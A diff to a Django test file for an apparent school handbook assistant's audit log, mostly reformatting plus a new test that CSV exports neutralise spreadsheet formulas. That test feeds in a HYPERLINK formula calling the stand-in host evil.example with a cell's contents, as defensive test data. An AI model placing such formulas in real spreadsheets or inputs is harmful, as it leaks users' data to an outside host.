@@ -25,7 +25,9 @@ User = get_user_model()
 @pytest.fixture
 def teacher():
     role = Role.objects.create(slug="teacher", name="Teacher")
-    return User.objects.create_user(username="alvarez", first_name="Rosa", last_name="Alvarez", password="x", role=role)
+    return User.objects.create_user(
+        username="alvarez", first_name="Rosa", last_name="Alvarez", password="x", role=role
+    )
 
 
 @pytest.fixture
@@ -104,8 +106,9 @@ def test_audit_is_append_only_in_admin(teacher, handbook, client):
     response = client.get(reverse("admin:audit_auditlog_change", args=[log.pk]))
     assert response.status_code == 200
     # But not editable or deletable
-    from audit.admin import AuditLogAdmin
     from django.contrib.admin.sites import site
+
+    from audit.admin import AuditLogAdmin
 
     admin_instance = AuditLogAdmin(AuditLog, site)
     assert not admin_instance.has_add_permission(None)
@@ -133,3 +136,21 @@ def test_csv_export(teacher, handbook, client):
     assert row["question"] == "When is a confiscated phone returned?"
     assert "Staff handbook" in row["sources"]
     assert row["refused"] == "no"
+
+
+def test_csv_export_neutralises_spreadsheet_formulas(teacher, handbook, client):
+    """A question is user-controlled text that lands in a board member's
+    spreadsheet. A cell starting with = + - @ would execute as a formula in
+    Excel/Sheets, so the export prefixes it with an apostrophe."""
+    User.objects.create_superuser(username="root", password="rootpass")
+    client.login(username="root", password="rootpass")
+    conversation = Conversation.objects.create(user=teacher)
+    ask(teacher, conversation, '=HYPERLINK("http://evil.example/"&A1,"click me")')
+
+    response = client.post(
+        reverse("admin:audit_auditlog_changelist"),
+        {"action": "export_csv", "_selected_action": [AuditLog.objects.get().pk]},
+    )
+    row = next(csv.DictReader(io.StringIO(response.content.decode())))
+    assert row["question"].startswith("'=HYPERLINK")
+    assert row["answer"] and not row["answer"].startswith(("=", "+", "-", "@"))
